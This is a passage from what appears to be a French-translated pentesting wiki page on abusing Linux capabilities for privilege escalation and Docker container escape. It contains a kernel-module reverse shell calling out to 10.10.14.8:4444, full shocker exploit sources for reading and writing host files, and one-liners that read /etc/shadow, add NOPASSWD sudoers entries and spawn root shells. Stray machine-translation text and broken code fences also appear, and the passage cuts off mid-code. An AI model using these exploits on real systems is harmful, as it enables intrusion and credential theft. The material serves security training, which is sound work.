**Cela signifie que vous pouvez** **insérer/supprimer des modules du noyau dans/du noyau de la machine hôte.**

**Exemple avec binaire**

Dans l'exemple suivant, le binaire **`python`** possède cette capacité.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Par défaut, la commande **`modprobe`** vérifie la liste des dépendances et les fichiers de mappage dans le répertoire **`/lib/modules/$(uname -r)`**.\
Pour en abuser, créons un faux dossier **lib/modules** :
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Alors **compilez le module du noyau que vous pouvez trouver dans les 2 exemples ci-dessous et copiez-le** dans ce dossier :
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Enfin, exécutez le code python nécessaire pour charger ce module noyau :
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Exemple 2 avec un binaire**

Dans l'exemple suivant, le binaire **`kmod`** possède cette capacité.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Ce qui signifie qu'il est possible d'utiliser la commande **`insmod`** pour insérer un module noyau. Suivez l'exemple ci-dessous pour obtenir un **reverse shell** en abusant de ce privilège.

**Exemple avec environnement (Docker breakout)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
À l'intérieur de la sortie précédente, vous pouvez voir que la capacité **SYS\_MODULE** est activée.

**Créez** le **module noyau** qui exécutera un shell inversé et le **Makefile** pour le **compiler** :

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
```markdown
{% endcode %}

{% code title="Makefile" %}
```
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Le caractère blanc avant chaque mot dans le Makefile **doit être une tabulation, pas des espaces**!
{% endhint %}

Exécutez `make` pour le compiler.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Enfin, démarrez `nc` dans un shell et **chargez le module** depuis un autre, et vous capturerez le shell dans le processus nc :
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Le code de cette technique a été copié du laboratoire "Abusing SYS\_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Un autre exemple de cette technique peut être trouvé sur [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet à un processus de **contourner les permissions de lecture de fichiers, et les permissions de lecture et d'exécution de répertoires**. Bien que conçu pour la recherche ou la lecture de fichiers, cela donne également au processus la permission d'invoquer `open_by_handle_at(2)`. Tout processus avec la capacité `CAP_DAC_READ_SEARCH` peut utiliser `open_by_handle_at(2)` pour accéder à n'importe quel fichier, même ceux hors de leur espace de noms de montage. Le handle passé à `open_by_handle_at(2)` est censé être un identifiant opaque récupéré en utilisant `name_to_handle_at(2)`. Cependant, ce handle contient des informations sensibles et modifiables, telles que les numéros d'inode. Cela a été identifié pour la première fois comme un problème dans les conteneurs Docker par Sebastian Krahmer avec l'exploit [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).\
**Cela signifie que vous pouvez** **contourner les vérifications des permissions de lecture de fichiers et les vérifications des permissions de lecture/exécution de répertoires.**

**Exemple avec un binaire**

Le binaire pourra lire n'importe quel fichier. Ainsi, si un fichier comme tar possède cette capacité, il pourra lire le fichier shadow :
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Exemple avec binary2**

Dans ce cas, supposons que le binaire **`python`** possède cette capacité. Pour lister les fichiers root, vous pourriez faire :
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Et pour lire un fichier, vous pourriez faire :
```python
print(open("/etc/shadow", "r").read())
```
**Exemple dans l'environnement (Docker breakout)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dans la sortie précédente, vous pouvez voir que la capacité **DAC\_READ\_SEARCH** est activée. En conséquence, le conteneur peut **déboguer des processus**.

Vous pouvez apprendre comment fonctionne l'exploitation suivante dans [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) mais en résumé, **CAP\_DAC\_READ\_SEARCH** nous permet non seulement de traverser le système de fichiers sans vérifications des permissions, mais supprime également explicitement toute vérification pour _**open\_by\_handle\_at(2)**_ et **pourrait permettre à notre processus d'accéder à des fichiers sensibles ouverts par d'autres processus**.

L'exploit original qui abuse de ces permissions pour lire des fichiers de l'hôte peut être trouvé ici : [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), ce qui suit est une **version modifiée qui vous permet d'indiquer le fichier que vous souhaitez lire comme premier argument et de le déverser dans un fichier.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
L'exploit nécessite de trouver un pointeur vers quelque chose de monté sur l'hôte. L'exploit original utilisait le fichier /.dockerinit et cette version modifiée utilise /etc/hostname. Si l'exploit ne fonctionne pas, peut-être que vous devez définir un fichier différent. Pour trouver un fichier qui est monté dans l'hôte, exécutez simplement la commande mount :
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Le code de cette technique a été copié du laboratoire "Abusing DAC\_READ\_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir la connaissance technique**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Cela signifie que vous pouvez contourner les vérifications des permissions d'écriture sur n'importe quel fichier, donc vous pouvez écrire dans n'importe quel fichier.**

Il y a beaucoup de fichiers que vous pouvez **écraser pour élever les privilèges,** [**vous pouvez obtenir des idées d'ici**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemple avec un binaire**

Dans cet exemple, vim a cette capacité, donc vous pouvez modifier n'importe quel fichier comme _passwd_, _sudoers_ ou _shadow_ :
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Exemple avec le binaire 2**

Dans cet exemple, le binaire **`python`** aura cette capacité. Vous pourriez utiliser python pour écraser n'importe quel fichier :
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Exemple avec environnement + CAP\_DAC\_READ\_SEARCH (Sortie de Docker)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur Docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Tout d'abord, lisez la section précédente qui [**abuse de la capacité DAC\_READ\_SEARCH pour lire des fichiers arbitraires**](linux-capabilities.md#cap\_dac\_read\_search) de l'hôte et **compilez** l'exploit.\
Ensuite, **compilez la version suivante de l'exploit shocker** qui vous permettra d'**écrire des fichiers arbitraires** dans le système de fichiers de l'hôte :
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Afin de s'échapper du conteneur docker, vous pourriez **télécharger** les fichiers `/etc/shadow` et `/etc/passwd` de l'hôte, **ajouter** un **nouvel utilisateur**, et utiliser **`shocker_write`** pour les réécrire. Ensuite, **accéder** via **ssh**.

**Le code de cette technique a été copié du laboratoire "Abusing DAC\_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Cela signifie qu'il est possible de changer la propriété de n'importe quel fichier.**

**Exemple avec un binaire**

Supposons que le binaire **`python`** ait cette capacité, vous pouvez **changer** le **propriétaire** du fichier **shadow**, **changer le mot de passe root**, et élever les privilèges :
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ou avec le binaire **`ruby`** ayant cette capacité :
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Cela signifie qu'il est possible de modifier les permissions de n'importe quel fichier.**

**Exemple avec un binaire**

Si python possède cette capacité, vous pouvez modifier les permissions du fichier shadow, **changer le mot de passe root**, et élever les privilèges :
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Cela signifie qu'il est possible de définir l'identifiant utilisateur effectif du processus créé.**

**Exemple avec un binaire**

Si python possède cette **capacité**, vous pouvez très facilement en abuser pour élever vos privilèges en tant que root :
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Une autre méthode :**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Cela signifie qu'il est possible de définir l'identifiant de groupe effectif du processus créé.**

Il existe de nombreux fichiers que vous pouvez **écraser pour élever les privilèges,** [**vous pouvez trouver des idées ici**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Exemple avec un binaire**

Dans ce cas, vous devriez rechercher des fichiers intéressants qu'un groupe peut lire car vous pouvez vous faire passer pour n'importe quel groupe :
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Une fois que vous avez trouvé un fichier que vous pouvez abuser (via la lecture ou l'écriture) pour élever les privilèges, vous pouvez **obtenir un shell en se faisant passer pour le groupe intéressant** avec :
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Dans ce cas, le groupe shadow a été usurpé afin que vous puissiez lire le fichier `/etc/shadow` :
```bash
cat /etc/shadow
```
Si **docker** est installé, vous pourriez **usurper** le **groupe docker** et en abuser pour communiquer avec le [**socket docker** et élever les privilèges](./#writable-docker-socket).

## CAP\_SETFCAP

**Cela signifie qu'il est possible de définir des capacités sur des fichiers et des processus**

**Exemple avec un binaire**

Si python possède cette **capacité**, vous pouvez très facilement en abuser pour élever les privilèges en tant que root :

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
Since the provided text does not contain any English content to translate, there is nothing to translate into French. If you provide the relevant English text, I can then translate it into French for you.
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Notez que si vous attribuez une nouvelle capacité au binaire avec CAP\_SETFCAP, vous perdrez cette capacité.
{% endhint %}

Une fois que vous avez la [capacité SETUID](linux-capabilities.md#cap\_setuid), vous pouvez aller à sa section pour voir comment élever les privilèges.

**Exemple avec environnement (Sortie de Docker)**

Par défaut, la capacité **CAP\_SETFCAP est donnée au processus à l'intérieur du conteneur dans Docker**. Vous pouvez vérifier cela en faisant quelque chose comme :
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Cette capacité permet de **donner n'importe quelle autre capacité aux binaires**, donc nous pourrions penser à **s'échapper** du conteneur en **abusant de l'une des autres évasions de capacités** mentionnées dans cette page.\
Cependant, si vous essayez de donner par exemple les capacités CAP\_SYS\_ADMIN et CAP\_SYS\_PTRACE au binaire gdb, vous constaterez que vous pouvez les lui donner, mais que le **binaire ne pourra pas s'exécuter après cela** :
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Après avoir enquêté, j'ai lu ceci : _Permitted: Il s'agit d'un **superset limitant pour les capacités effectives** que le thread peut assumer. C'est aussi un superset limitant pour les capacités qui peuvent être ajoutées à l'ensemble héritable par un thread qui **n'a pas la capacité CAP\_SETPCAP** dans son ensemble effectif._\
On dirait que les capacités Permitted limitent celles qui peuvent être utilisées.\
Cependant, Docker accorde également par défaut le **CAP\_SETPCAP**, vous pourriez donc être capable de **définir de nouvelles capacités à l'intérieur de celles héritables**.\
Cependant, dans la documentation de cette capacité : _CAP\_SETPCAP : \[…] **ajouter n'importe quelle capacité de l'ensemble bounding du thread appelant à son ensemble héritable**._\
Il semble que nous ne pouvons ajouter à l'ensemble héritable que des capacités provenant de l'ensemble bounding. Ce qui signifie que **nous ne pouvons pas mettre de nouvelles capacités comme CAP\_SYS\_ADMIN ou CAP\_SYS\_PTRACE dans l'ensemble hérité pour escalader les privilèges**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fournit un certain nombre d'opérations sensibles, y compris l'accès à `/dev/mem`, `/dev/kmem` ou `/proc/kcore`, la modification de `mmap_min_addr`, l'accès aux appels système `ioperm(2)` et `iopl(2)`, et diverses commandes de disque. La commande `FIBMAP ioctl(2)` est également activée via cette capacité, ce qui a causé des problèmes dans le [passé](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Selon la page de manuel, cela permet également au détenteur de `réaliser une gamme d'opérations spécifiques aux appareils sur d'autres dispositifs`.

Cela peut être utile pour l'**escalade de privilèges** et la **sortie de Docker**.

## CAP\_KILL

**Cela signifie qu'il est possible de tuer n'importe quel processus.**

**Exemple avec un binaire**

Supposons que le binaire **`python`** ait cette capacité. Si vous pouviez **également modifier une configuration de service ou de socket** (ou tout fichier de configuration lié à un service), vous pourriez y installer une porte dérobée, puis tuer le processus lié à ce service et attendre que le nouveau fichier de configuration soit exécuté avec votre porte dérobée.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Élévation de privilèges avec kill**

Si vous disposez des capacités de kill et qu'il y a un **programme node exécuté en tant que root** (ou en tant qu'un autre utilisateur), vous pourriez probablement lui **envoyer** le **signal SIGUSR1** et le faire **ouvrir le débogueur node** auquel vous pouvez vous connecter.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir la connaissance technique**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Cela signifie qu'il est possible d'écouter sur n'importe quel port (même sur les ports privilégiés).** Vous ne pouvez pas élever directement les privilèges avec cette capacité.

**Exemple avec binaire**

Si **`python`** a cette capacité, il pourra écouter sur n'importe quel port et même se connecter depuis celui-ci vers tout autre port (certains services exigent des connexions à partir de ports privilégiés spécifiques)

{% tabs %}
{% tab title="Écouter" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Connecter" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet à un processus de **créer des types de sockets RAW et PACKET** pour les espaces de noms réseau disponibles. Cela permet la génération et la transmission de paquets arbitraires à travers les interfaces réseau exposées. Dans de nombreux cas, cette interface sera un dispositif Ethernet virtuel qui peut permettre à un **conteneur compromis** de **falsifier** des **paquets** à différents niveaux du réseau. Un processus malveillant ou un conteneur compromis avec cette capacité peut s'injecter dans un pont amont, exploiter le routage entre conteneurs, contourner les contrôles d'accès réseau et, de manière générale, altérer le réseau de l'hôte si un pare-feu n'est pas en place pour limiter les types et contenus de paquets. Enfin, cette capacité permet au processus de se lier à n'importe quelle adresse dans les espaces de noms disponibles. Cette capacité est souvent conservée par les conteneurs privilégiés pour permettre au ping de fonctionner en utilisant des sockets RAW pour créer des requêtes ICMP depuis un conteneur.

**Cela signifie qu'il est possible d'espionner le trafic.** Vous ne pouvez pas élever directement vos privilèges avec cette capacité.

**Exemple avec un binaire**

Si le binaire **`tcpdump`** possède cette capacité, vous pourrez l'utiliser pour capturer des informations réseau.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
```markdown
Notez que si l'**environnement** vous donne cette capacité, vous pourriez également utiliser **`tcpdump`** pour espionner le trafic.

**Exemple avec le binaire 2**

L'exemple suivant est un code **`python2`** qui peut être utile pour intercepter le trafic de l'interface "**lo**" (**localhost**). Le code provient du laboratoire "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
